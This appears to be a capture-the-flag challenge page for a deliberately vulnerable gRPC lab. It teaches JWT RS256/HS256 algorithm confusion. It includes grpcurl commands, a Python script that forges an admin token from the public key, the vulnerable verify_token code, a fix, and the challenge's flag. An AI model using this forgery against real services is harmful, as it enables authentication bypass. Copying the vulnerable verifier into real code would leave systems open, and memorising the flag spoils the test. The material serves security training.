# Challenge 04 — JWT Algorithm Confusion

**Category:** Broken Authentication
**Difficulty:** 🔴 Hard
**Service:** `AuthService`, `UserService`
**Flag:** `FLAG{jwt_4lg0r1thm_c0nfus10n_pwn3d}`

---

## Background

JWT Algorithm Confusion (also called "alg confusion" or "RS256/HS256 confusion") is a critical authentication bypass. It exploits servers that:

1. **Support both HS256 and RS256** JWT algorithms
2. **Expose their RSA public key** (e.g., via a `/jwks` endpoint or a `GetPublicKey` RPC)

The attack:
- In **RS256**: server signs with a private key, verifies with the **public key**
- In **HS256**: server signs and verifies with the **same secret**
- If a server accepts **both** algorithms, an attacker can forge an HS256 token using the **public key as the HMAC secret** — and the server will accept it

---

## Objective

1. Fetch the RSA public key via `AuthService.GetPublicKey`
2. Forge a JWT with `role=admin` signed with HS256 using the public key
3. Use the forged token to access admin resources

---

## Steps

### Step 1: Get the public key

```bash
grpcurl -plaintext localhost:50051 dvgrpc.AuthService/GetPublicKey
```

Response includes the PEM-encoded RSA public key.

### Step 2: Forge the token (Python)

```python
import jwt
import datetime

PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
<paste key here>
-----END PUBLIC KEY-----"""

forged_payload = {
    "user_id":  1,
    "username": "attacker",
    "role":     "admin",
    "exp":      datetime.datetime.utcnow() + datetime.timedelta(hours=1),
}

# Sign with HS256 using PUBLIC KEY as the secret — this is the attack
forged_token = jwt.encode(forged_payload, PUBLIC_KEY, algorithm="HS256")
print(forged_token)
```

### Step 3: Use the forged token

```bash
# Verify the token is accepted
grpcurl -plaintext \
  -H "Authorization: Bearer <forged_token>" \
  localhost:50051 dvgrpc.AuthService/WhoAmI \
  -d '{"token":"<forged_token>"}'

# Access admin profile via IDOR
grpcurl -plaintext \
  -H "Authorization: Bearer <forged_token>" \
  localhost:50051 dvgrpc.UserService/GetProfile \
  -d '{"user_id":1}'
```

---

## Automated Exploit

```bash
python client/exploits/exploit_04_jwt_confusion.py
```

---

## Vulnerable Code

`server/interceptors/auth_interceptor.py`:

```python
def verify_token(token: str) -> dict | None:
    # Strategy 1: HS256 with secret ✓
    # Strategy 2: RS256 with public key ✓
    # Strategy 3 (VULNERABLE): HS256 with PUBLIC KEY as HMAC secret ✗
    if pub_key:
        try:
            return pyjwt.decode(token, pub_key, algorithms=["HS256"])  # BUG
        except pyjwt.InvalidTokenError:
            pass
```

---

## Fix

```python
# SECURE: Only accept the algorithm that matches the key type
def verify_token(token: str) -> dict | None:
    # HS256 tokens only — with the application secret
    try:
        return pyjwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    except pyjwt.InvalidTokenError:
        pass
    # Never try HS256 with an asymmetric key
    return None
```

---

## Further Reading

- [PortSwigger: JWT attacks](https://portswigger.net/web-security/jwt)
- [Auth0: Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [OWASP: Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
